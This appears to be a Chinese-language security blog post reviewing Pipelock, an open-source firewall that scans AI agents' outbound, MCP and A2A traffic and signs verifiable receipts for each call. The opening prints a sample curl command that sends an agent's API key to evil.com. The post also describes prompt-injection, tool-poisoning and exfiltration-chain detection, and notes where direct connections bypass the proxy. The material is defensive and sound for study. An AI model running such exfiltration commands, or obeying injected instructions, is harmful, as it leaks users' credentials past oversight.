---
title: 「AI Agent防火墙」Pipelock拆解：MCP+外联扫描，每次调用签一张可验证回执
url: https://mp.weixin.qq.com/s/1F_p9D4ofn1Fv5XMK8jnIA
source: Doonsec's feed
date: 2026-10-01
fetch_date: 2026-10-02T07:43:04.982843
---

# 「AI Agent防火墙」Pipelock拆解：MCP+外联扫描，每次调用签一张可验证回执

# 「AI Agent防火墙」Pipelock拆解：MCP+外联扫描，每次调用签一张可验证回执

原创

句芒安全实验室
句芒安全实验室

句芒安全实验室

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

你的 AI Agent 环境里有 `$PROVIDER_API_KEY`，又有 shell 权限。一条 `curl "https://evil.com/steal?key=$PROVIDER_API_KEY"` 就结束了。

这是我翻 `luckyPipewrench/pipelock` 时最想验证的一句话：它把「Agent 手上有没有密钥」和「Agent 能不能上网」拆成两件互斥的事，并给每一次被中介的调用签一张可离线自验的回执。

![Pipelock Agent Egress Report：风险评级、活动时间线、分类发现与证据附录](https://mmbiz.qpic.cn/sz_mmbiz_png/J2hBCjr4Lfvib0cGGBTUINGVGWoXJbwKEr7dtWXNloX9w2ZlZWdPlFu3xGMruuSKBmafNVib6iazbb4iag7sms4vB6ianKVeFyVZNt9ibcodbF1kc/640?wx_fmt=png "Pipelock Agent Egress Report：风险评级、活动时间线、分类发现与证据附录")

## 先核身份

按老规矩，发布前用 GitHub API 当天核实：仓库 `luckyPipewrench/pipelock`，**913 颗星、104 个 fork、6 个未关闭 issue**，贡献者 12 人。主语言 **Go**（语言统计 100% Go），协议 **Apache-2.0**，另有 `enterprise/` 目录单独用 **Elastic License 2.0**。2026 年 2 月 8 日建仓，最近一次提交在 **2026 年 9 月 30 日**，最新发布 **v3.5.0**（2026-09-01）。它已经进了 CNCF Landscape 的 Security & Compliance 分类。

它的自我介绍是「面向 AI Agent 的防火墙」：坐在 Agent 和网络之间，检查被中介的 HTTP、WebSocket、MCP、A2A 流量。

## 核心是把两件事拆开

Pipelock 的设计前提叫 capability separation（能力分离）：在强制部署里，**Agent 进程有密钥但没有直连网络的能力**，Pipelock 有网络但没有 Agent 的密钥。这样即使 Agent 被提示注入，它也够不到防火墙自己的控制面。

三种模式对应三种强度：`strict` 只放白名单、不开放网页浏览；`balanced` 是默认，拦粗暴的、检出复杂的；`audit` 只记日志不拦。针对跑无审查、去审查模型的 Agent，它另有一个 `hostile-model` 预设，在 strict 上叠加激进熵阈值、整类网络工具封禁、会话绑定和一个预置 kill switch。

`pipelock audit ./project` 会扫项目里的风险并生成一份贴合项目的配置；`pipelock audit score --config` 再按 23 个类别、170 分预算打分给字母等级。

## 扫描面：URL、DLP、注入

URL 扫描是一条有序流水线：长度与解析检查、scheme 校验、CRLF 与路径穿越、白名单黑名单、字面 IP 的 SSRF 底线、DLP、路径与查询串熵分析、查询参数里的嵌套 URL、DNS SSRF 与重绑定、按域限速、数据预算，最后是上下文检查。一个细节值得记：**DLP 在 DNS 解析之前跑**，密钥在 DNS 查询离开代理之前就被拦下。

DLP 内置 65 条模式，覆盖 API key、token、凭证、加密货币私钥、环境密钥和金融标识，带校验和验证；BIP-39 助记词检测用词典查表、滑窗加 SHA-256 校验和。响应侧内置 34 条提示注入与状态投毒模式，外加 6 遍归一化——零宽字符、同形字、leet、可选空白、元音折叠、base64、hex。SSE 流式响应逐 token 走检测，命中就 fail-closed 断流。

请求侧可选改写：把命中的密钥换成 `<pl:aws-access-key:1>` 这类占位符，回执里只记类别计数，不记明文。另有地址保护（ETH/BTC/SOL/BNB 前后缀指纹，防换址）、canary 蜜标（合成密钥一出现在外联里，就说明链路里有东西在偷环境变量）、以及 `pipelock skill-scan`：清点技能文件、对比操作者自己的 lock 文件，标出「读凭证→发网络」这类源到汇组合并给出行号。

## MCP 与 A2A

MCP 是双向扫的：客户端请求查 DLP 与工具参数注入；服务端响应在 Agent 看到之前先扫；`tools/list` 的描述查隐藏指令和中途 rug-pull 改动；30 条内置工具策略在工具调用执行前拦破坏性删除、凭证访问、反弹 shell、持久化和编码执行；10 条类别轴模式检测侦察→窃凭证→暂存→持久化→外联→回连这类调用链，带间隔容忍。A2A 走 forward 与 MCP 两条路径做 Agent Card 投毒、卡片漂移和会话走私检测。v3.2.0 起非 loopback 的 MCP HTTP listener 默认 fail-closed，要 `--mcp-auth-token-file` 才开。

## 回执：这套最值得抄

第二个重点是证据。它跑一个 **flight recorder**：按写者分文件、哈希链的 JSONL，加 Ed25519 签名的检查点，带 DLP 脱敏；`pipelock init` 就给标准安装备好 recorder 目录和签名密钥。

动作回执（action receipts）记录每次被中介的动作，带裁决、策略哈希、传输方式和命中的扫描层。验签用 `pipelock verify-receipt --key ./out/signer.pub`；不 pin 密钥的运行只能做结构校验，并且返回非零退出码。它还有一份跨实现一致性测试语料，Go、TypeScript、Rust、Python 四套独立验证器跑同一批测试向量。回执可以用 `pipelock anchor receipts` 锚到本地后端或 Rekor 透明日志。

![Pipelock Evidence Report 评分卡与回执时间线：四行独立评估，没有总状态](https://mmbiz.qpic.cn/sz_mmbiz_png/J2hBCjr4LfuicNbJ7bqt5M2uLG5lTZzbvXcc7QuuSCSQDZ9b3RvIHu8vMicz2yGHPZ3Wg9ydicQOpYeIDUjOlBJbv2FysnlpQAnJPs5h575icBc/640?wx_fmt=png "Pipelock Evidence Report 评分卡与回执时间线：四行独立评估，没有总状态")

## 这张评分卡是全文最该看的地方

它没有给一个绿色的总状态，而是把四个判断分开写，每一行都写清楚自己不证明什么。

**Authentic（签名可验）**：7/7 条回执对受信密钥验签通过，信任来源是操作者配置的来源，不是 TOFU。**Untampered（链完整）**：哈希链完整，序号 0–6 连续。**Anchored（锚定）**：没有记录任何 inclusion proof，排序只靠哈希链本身，它直接写「把排序当独立锚定之前先补一个外部 inclusion proof」。**Completeness（完整性）**：7 条回执、0 个链缺口，只覆盖已声明的 Pipelock 边界内的被中介外联，**不能证明边界之外没有发生未中介的动作**。

README 里还有两句更该抄的诚实声明：demo 用临时密钥，只证明回执自洽、不绑定一个具名身份；操作者持有签名密钥，所以回执只证明「这个边界决定了什么、密钥持有者签了它」，**不证明操作者是诚实的**。AARP/SVID 的身份评估目前只是验证器侧的离线配置，不是运行时身份强制。

这三句比任何功能列表都有用。句芒写过 SkillSpector、Snyk Agent Scan，回答「这个技能坏不坏」；写过 CyberStrike，回答「这个技能还是不是我发出去的那一份」；Pipelock 回答的是第三个问题——**这次动作到底有没有真的经过边界，以及边界之外它证明不了什么**。把「证明不了什么」写进产品，比在仪表盘上放一个绿勾更难，也更有用。

## 上手

单二进制，不带 cgo，覆盖 macOS、Linux、Windows 的 amd64 与 arm64，每个 release 带 SHA-256 校验和，也可以 Go 1.26+ 从源码 `make build` 或 `make install`，另有 Homebrew、Docker 镜像与 Helm chart 三条路。

```
pipelock init
pipelock check --url "https://evil.com/?k=AKIAIO...MPLE"   # blocked: AWS Access ID
pipelock check --url "https://docs.python.org/3/"           # allowed
pipelock demo --receipts-dir ./out
pipelock verify-receipt "$(ls ./out/*.json | head -1)" --key ./out/signer.pub
```

`pipelock demo` 会跑真实攻击场景、拦下来、把 7 张签名回执和公钥写到磁盘，不需要配置、不需要网络。

集成面很宽：Claude Code、OpenAI Codex、Cline、Continue、OpenCode、Pi、Zed、Cursor、VS Code、JetBrains、OpenAI Agents SDK、Google ADK、AutoGen、CrewAI、LangGraph，还有 OpenClaw 与 Nous Research 的 Hermes。不在名单里的 MCP 客户端，用 `pipelock generate mcporter` 读任意带顶层 `mcpServers` 的 JSON，把每个 server 都包过代理。

## 避坑

* **许可混搭**：核心 Apache-2.0，`enterprise/` 目录 ELv2。预编译产物（Homebrew、GitHub release、Docker 镜像）**带付费代码**，`make build`、`make install` 或仓库 Dockerfile 才是纯社区版。要审计就先从源码构建。
* **免费与付费的边界**：扫描、检测、强制、隔离、回执验证、单 Agent 证据查看器永久免费；按 Agent 身份、预算、配置隔离、操作者仪表盘、覆盖证书属于 Pro；Conductor 车队控制面属于 Enterprise。
* **必须有边界才成立**：Pipelock 只拦「走代理」的流量。非协作工具直连出网，要靠 OS 或网络命名空间兜底。它自己写了：`pipelock contain` 用 3-UID（operator/proxy/agent）模型，agent 跑在没有对外路由的私有网络命名空间里，只通过 doorway socket 到代理，nftables owner-match 是兜底。
* **降级语义要看清楚**：容器里 `--best-effort` 保留 Landlock，在 amd64 保留 seccomp；拿不到网络命名空间的启动会被标成 `advisory-override`，这时网络扫描退化为基于代理的路由，**直连可以绕过**。`--strict` 会直接拒绝这种启动。
* **README 的数字对不上**：正文里 Helm chart 写「从 3.6.0 起带 attestation」，`gh attestation verify` 的例子也写 3.6.0，但发布页最新是 **v3.5.0**。看数字前先自己数一遍。
* **性能数字的口径**：热路径 URL 扫描约 40 微秒，这是扫描本身的开销，不含 TLS 拦截、流式与 MCP 包装的完整链路。
* **kill switch 有六个来源**：配置文件、远程 API、SIGUSR1、sentinel 文件、Conductor 远程 kill、过期策略包检测，任一激活就全量阻断。这既是能力也是风险点。

## 适合谁

想给本地跑的编码 Agent 加一道外联边界的开发者和安全工程师；做 MCP 与 A2A 安全治理、想直接抄「双向扫 + 工具投毒 + 调用链」这套设计的人；做 Agent 审计与合规、需要可离线自验回执的人；以及想把已有 LLM 订阅接进一个带证据的边界、又不想上 SaaS 的团队。

不太适合：以为装一个代理就等于全网隔离的人；不读 Apache-2.0 与 ELv2 两份协议、也不看部署边界的人。

Pipelock 最值得看的不是 913 颗星，是它把「我证明什么」和「我不证明什么」写进了同一张评分卡。做 Agent 安全的人，这两句比功能列表更值得读。

预览时标签不可点

作者提示: 内容由AI生成

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/hHXiayYmia1LqLl6UmtMH3DtucaIaicr9HY5ffO5ckGVia3LvuCPCDNRNAX9fEmhicdmtRshennOyOqtPic6GTeASRNg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过